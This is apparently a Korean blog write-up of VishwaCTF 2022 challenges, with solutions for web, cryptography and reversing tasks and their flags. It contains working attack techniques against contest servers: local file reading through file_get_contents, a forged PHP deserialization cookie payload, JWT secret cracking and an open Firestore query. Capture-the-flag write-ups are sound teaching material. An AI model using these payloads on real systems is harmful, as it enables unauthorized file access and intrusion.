---
title: "2022 Vishwactf"
date: 2022-03-21T21:33:14+09:00
---

## WEB

### Stock Bot
> We have our online shop of computer related accessories. So for easy customer interaction we have made a stock bot which will give you how many units of enlisted products are available.   
> https://st0ck-b0t.vishwactf.com/

페이지에 접속해보면 봇에게 특정 상품을 요구할 수 있다. 아무거나 입력해보면 패킷 상에서 다음과 같은 결과를 받아볼 수 있다.

```
<br />
<b>Warning</b>:  file_get_contents(hihihihihihihih): failed to open stream: No such file or directory in <b>/opt/app-root/src/Products/check.php</b> on line <b>10</b><br />
{"Quantity":false}
```
위 오류를 통해 다음과 같은 정보를 알 수 있다.
- PHP 사용
- `file_get_contents`를 통해 상품을 가져옴
- 상품을 체크하는 로직은 `/opt/app-root/src/Products/check.php`에 있음.

`file_get_contents` 함수를 사용하므로 Local file을 읽어들일 수 있다. 우선 위 오류에 출력된 `check.php` 부터 읽어보자

```
<?php \n\n    if(isset($_GET['product'])){\n        $product = $_GET['product'];\n        header('Content-type: application/json');\n        if(strpos($product,'Flag')){\n            $data = array('Flag' => file_get_contents($product));\n        }\n        else{\n            $data = array('Quantity' => file_get_contents($product));\n        }\n        echo json_encode($data);\n    }\n\n?>
```

위 코드를 통해 Flag를 요청해야 함을 알 수 있다. 봇 채팅을 이용하면 js에서 무시되고, check.php에 직접 접근해서 요청하면 flag를 얻을 수 있다.
```
VishwaCTF{b0T_kn0w5_7h3_s3cr3t}
```





### Todo List
> Simple Todo list website to manage your tasks. Use it wisely.  
> https://t0-d0-l1st.vishwactf.com/

간단한 TODO 작성 홈페이지가 제공된다.
```
/* Hint: Flag is present at /flag.php */
```
페이지 소스코드 내 `/flag.php`에 접근하라는 힌트가 주어졌다. 화면 우측 하단 버튼을 클릭하면 소스코드를 볼 수 있는데 내용은 아래와 같다.
```
<?php

Class ShowSource{
    public function __toString()
    {
        return highlight_file($this->source, true);
    }
}

if(isset($_GET['source'])){
    $s = new ShowSource();
    $s->source = __FILE__;
    echo $s;
    exit;
}

$todos = [];

if(isset($_COOKIE['todos'])){
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 40);
    $m = substr($c, 40);
    if(sha1($m) === $h){
        $todos = unserialize($m);
    }
}

if(isset($_POST['text'])){
    $todo = $_POST['text'];
    $todos[] = $todo;
    $m = serialize($todos);
    $h = sha1($m);
    setcookie('todos', $h.$m);
    header('Location: '.$_SERVER['REQUEST_URI']);
    exit;
}
?>
```
TODO를 추가하면 Cookie를 통해 관리됨을 알 수 있다. 또한 serialize/deserialize를 이용하여 쿠키 내 TODO list를 저장하고, 읽어들임을 알 수 있다.

`SHA1` 해싱을 통해 무결성을 검증하는 것처럼 보이지만 결국엔 serialize된 데이터를 변조한 후에 저 값을 나도 만들 수 있기 때문에 별로 문제가 되진 않는다.

```
a:5:{i:0;s:4:"AAAA";i:1;s:4:"BBBB"}
```
cookie 내 존재하는 serialize 데이터는 위와 같다. 현재 TODO list에 AAAA와 BBBB를 추가한 상태다.

다시 코드를 보면 `ShowSource` 클래스가 존재하고, 해당 클래스는 출력하려고 할 때, `$this->source`의 소스코드를 출력하는 것을 확인할 수 있다. 

```
a:5:{i:0;s:4:"AAAA";i:1;O:10:"ShowSource":1:{s:6:"source";s:10:"./flag.php";}}
```

deserialize된 데이터는 화면에 TODO List로 출력되므로, 기존의 배열 구조를 유지한 상태로 변조된 `ShowSource` 클래스를 삽입하여 공격이 가능하다.

```
Flag is VishwaCTF{t7e_f1a6_1s_1is73d}
```



### Request Me FLAG
> Somebody hosted this website having flag in it. Just request the FLAG to them maybe they will give you.  
> https://r3qu35t-m3-fl4g.vishwactf.com/

스트레스 받게 했던 문제. 홈페이지에 접속하면 `index.php`에서 302 응답을 받아 `404.php`로 리다이렉트 된다. 도통 뭘 원하는지 몰랐는데, 대회 종료 후 라업을 보니,,,

```
curl https://r3qu35t-m3-fl4g.vishwactf.com/index.php -X FLAG -i
```
ㅋ,,,
```
VishwaCTF{404_1s_ju57_4n_i11u5ion}
```

### Strong Encryption
> This is our one of the most strong encryption algorithm. Try to decrypt the flag by tracing how it is encrypted.  
>   
> Url - https://5tr0ng-3ncrypt10n.vishwactf.com/

접속하면 아래와 같은 php 코드를 확인할 수 있다.
```php
<?php

    // Decrypt -> 576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982452f12f4712f4c769a75b33cb995fa169056168939a8b0b28eafe0d724f18dc4a7

    $flag="";

    function encrypt($str,$enKey){

        $strHex='';
        $Key='';
        $rKey=69;
        $tmpKey='';

        for($i=0;$i<strlen($enKey);$i++){
            $Key.=ord($enKey[$i])+$rKey;
            $tmpKey.=chr(ord($enKey[$i])+$rKey);
        }    

        $rKeyHex=dechex($rKey);

        $enKeyHash = hash('sha256',$tmpKey);

        for ($i=0,$j=0; $i < strlen($str); $i++,$j++){
            if($j==strlen($Key)){
                $j=0;
            }
            $strHex .= dechex(ord($str[$i])+$Key[$j]);
        }
        $encTxt = $strHex.$rKeyHex.$enKeyHash;
        return $encTxt;
    }

    $encTxt = encrypt($flag, "VishwaCTF");

    echo $encTxt;

?>
```
카테고리는 WEB인데 그냥 Crypto,,? 라고 하기도 뭐하고 그냥 웹립싱? ㅋㅋㅋ

```python
def dec(key, ciphertext):
    ks = ''.join([str(ord(k) + 0x45) for k in key])
    f = ''
    for i in range(0, len(ciphertext), 2):
        c = ciphertext[i:i+2]
        b = int(c,16)
        k = int(ks[(i/2)%len(ks)])
        f += chr(b - k)
    return f

dec("VishwaCTF", "576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982")
```
위와 같이 decrypt 코드를 짜서 돌리면 된다.
```
VishwaCTF{y0u_h4v3_4n_0p_m1nd}
```


### Keep Your Secrets
> Yet another API for ‘user’ signup and login. You know the drill, GO!  
> https://k33p-y0ur-53cr3t5.vishwactf.com/

접속하면 아래와 같이 API 사용법에 대한 내용이 나온다.
```
📃 API documentation V.2.0 📃

GET Routes

/api/signup/{username} - register a user

POST Routes

/api/login/user - only meant for admins
pass your token in headers as 'token'
```

signup을 진행하면 token을 발급받게 되는데, JWT 포맷으로 이루어져있다. none type attack을 시도해봤지만 안됐고, key를 crack하는 문제일 것이라고 생각하여 브루트포스를 진행했다.

Key는 owasp였다.
```
VishwaCTF{w3@k_$ecr3t$}
```



### Flag .Collection
> We are collecting cool flag names for our next CTF, please suggest us some cool names and we’ll store them in our database for our next CTF.  
> https://fl4g-c0ll3ct10n.vishwactf.com/

이건 아직 모름. firebase 관련 문제인듯 한데,,,

https://firestore.googleapis.com/v1/projects/vishwa-challenge-12/databases/(default)/documents/flag

```
vishwactf{c0nfigur3_y0ur_fir3b@s3_rule$}
```

## Cryptography
### John the Rocker
제공된 문제를 ssh2john으로 추출하고, John the Ripper 사용하여 Hash crack 하는 문제.

```
VishwaCTF{!!**john**!!}
```

### Tallest Header
> My friend sent me file and said how amazing this is, but i think while sending file corrupted. Can you help me fixing this? PS: make it lowercase

binwalk를 이용해 카빙해보면 enc 데이터와 enc 소스코드를 얻을 수 있음. 단순 치환암호였기 때문에 수작업으로 이를 해독함.

```
VishwaCTF{TR1CKY_H34D3R_W1TH_P3RMU7AT10N}
```


### JumbleBumble
> Jumble Bumble been encode, get the flag from the code

문제의 encrypt 로직을 보면 다음과 같다.
```py
import random
from Crypto.Util.number import getPrime, bytes_to_long

flags = []

with open('stuff.txt', 'rb') as f:
    for stuff in f.readlines():
        flags.append(stuff)


with open('flag.txt', 'rb') as f:
    flag = f.read()
    flags.append(flag)

random.shuffle(flags)

for rand in flags:
    p = getPrime(1024)
    q = getPrime(1024)
    n = p * q
    e = 4
    m = bytes_to_long(rand)
    c = pow(m, e, n)
    with open('output.txt', 'a') as f:
        f.write(f'{n}\n')
        f.write(f'{e}\n')
        f.write(f'{c}\n\n')
```
stuff라는 쓰레기값들 안에 flag를 섞어서 암호화를 진행한다. 바로 취약점이 보이는데, e 값이 4로 설정 되어있는 것으로 보아

$$ m^e < n $$

위 식이 만족하게 되어 mod 연산이 취해지지 않을 것으로 예측된다. encrypt 된 데이터는 아래와 같다.
```
9895257608525793168362389845628902285985444377453839117812158233120160362300672532695792680438878396298456828123924966217724176436632686888103153999249472707375426050469256231026071966788110318535037779314797806833009930390757623009011661785912329049206373090090589773206279477261440565895174331963962792559239659309238293258089454720397039707231070127034478593376342981536650704348893537846905760621231615108102393714905122870351385322152897444168225168056559087784157523741592026904609638367875668745595850082618894323148264944455655700677515440124103204861146257676590547651155626828635322867579094811964846886101
4
49027849573693202016831483632288631019808489156023569102048032150709765393653121181751127578575150457778413775376318751815435494031059936819766580971267297386871600535770171180352357436389146506250000

13875949052404491911414181895983637482846633228970540023452432562087682195756805219573210741137799237884043688791417306305818188870813790457320148044093590478187480631446643690866321314181010958511571228795017652179970526429438825651647765978827268148163927174313644593348926140682168968216291774998867471854783331380577210977623996418865097077663735040452220161573609941069034736063784264686818819258665441946012025040180171464198266220677946704235863025443292286333375087008651661638393602537786950686827284000344724857341145582649448857235097527426922197034644156867813692660895345624400574114897111307245570215331
4
172294788480927470854941781874710437286070659277780650071535516231337741361583941039937997353672134039446400936723729530991742022963920663063490276394464733091639231901339240204663904305031266487740176

...

15037529579687360861096387696366760797121686138020847511985324546620490707314884485302515069062431311870675455252150581715037426488992458312603876045036247869324680267802838509164842442082185070374090555135906508010263142300393487553860650608224430747311857856856536073085405153215655705120237926029776422115558004813906765886787243441237423191161812773613046591244049672405047954246049425752974088612997018343505216188062681620174025602086021417387654213694245656803351059862799297801633547670285095074312312534624008909932295882358226767586379751712434692265123244627532035273292463057036597394919922642211695547507
4
171680542724254089150724369075636860881561740639443447403991907144155043889456031184227042605537625708619190865538321595495754050771552489950588341254767905917106592421615121882232598897306466913601296

13429318136571852145145649411772491995332035293730226791251563560301809436776254817224615289443655170569736246470393909437556925322131303835353484836979951773463320270476900331307190257818047623952712925834888009156673785486596961309758468135925110107730363598538946152166857127804719928347657986687722906484485830771687328344892838668063970810268430714107514868174858412310311572137489165417257889449057032018101807656492665066046884558691042751221915774948607359726402125391345567795296366495183103950017877281952404893826385252866830903527304184990783022333007975894148881834118051727610738520081545675298240582993
4
49620546793711579782402639693377280522728526662509820457210884055445991049736319471760879817907638541914701296886947181962112393611224773708306316648797562964914200791382533487387764578519064974083856
```

아래와 같이 복호화 코드를 작성했다.
```py
import gmpy2
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes


raw  = open("./jumblebumble.txt").read()

data_list = raw.split('\n\n')
print(len(data_list))

for i in range(1):
    for data in data_list:
        if len(data) < 5: break
        objs = data.split('\n')

        n = gmpy2.mpz(objs[0])
        e = gmpy2.mpz(objs[1])
        c = gmpy2.mpz(objs[2])


        s1 = gmpy2.isqrt(c+i*n)
        s2 = gmpy2.isqrt(s1)

        print(long_to_bytes(s2).replace(b'\x00', b''))
```
실행하면 플래그가 나온다
```
VishwaCTF{c4yp70gr2phy_1s_n07_e25y}
```

## Reversing
### Run The Cat
cat 문자로 덕지덕지 난독화 되어있는 문제였는데, 하나씩 변환하다보면 실제 로직은 그리 복잡하지 않음. 보기 좋게 변환하면 아래와 같음.
```py

def mul3(cat):
    return str(int(cat)*3)

def combine(cat, cats):
    #print(cat, cats)
    cat1 = 0
    cat2 = 0
    i = 0
    result = ""
    while cat1 < len(cat) and cat2 < len(cats):
        if i%3 == 0:
            result += cats[cat2]
            cat2 += 1
        else:
            result += cat[cat1]
            cat1 += 1
        i += 1
    return result

def rev(cat):
    return cat[::-1] # reverse

def mul3_and_rev(cat):
    # <앞3글자*3><입력값거꾸로>
    return mul3(cat[:3]) + rev(cat)

def none(cat):
    return cat

def Rat(cat):
    # Cat9<앞3글자>
    return "Cat9" + cat[:3]

def main(cat):
    if len(cat) == 9:
        if str.isdigit(cat[:3]) and\
            str.isdigit(cat[len(cat)-3+1:]):
                result = combine(mul3_and_rev(cat), Rat(none(rev(cat))))
                print(mul3_and_rev(cat), Rat(none(rev(cat))))
                print(result)
                if result == "C20a73t0294t0ac2194":
                    flag = "runner_" + cat
                    print("So here you are!! VishwaCTF{",flag,"}")
                    return True
    return False

print("What'S tHe aNsWer")
cat = input()
main(cat)
```
result가 `C20a73t0294t0ac2194` 문자열이 되도록 하는 길이 9의 input 값을 찾는 문제인데, 로직상 가운데 3글자가 cat이다. 이후는 그냥 브포 돌렸다.
```python
for num1 in range(0,1000):
    for num2 in range(0,1000):
        key = "%.3d" % num1 + "cat" + "%.3d" % num2
        if (Cat(key)): exit(1)
```
실행해보면 플래그가 나온다.
```
VishwaCTF{runner_691cat420}
```

### OverCook
`printflag()` 함수가 존재하고, 그 내에 10진수 값들을 string으로 풀어내면 플래그가 나온다.
```
VishwaCTF{r3vers1ng_dud3}
```


### Take Your Time
조건을 만족하면 `itachi()` 함수를 실행하기 때문에, 강제로 코드패치를 통해 실행을 시켜주니 플래그가 나왔다.
```
VishwaCTF{t!m3_!5_m0n3y}
```

### Confusion
바이너리에서 한글자씩 비교하는 cmp 연산 부분을 분석해보면 어떤 값을 입력해야 하는지 알 수 있음.
```
VishwaCTF{64_103_109_107_65_96_107_47}
```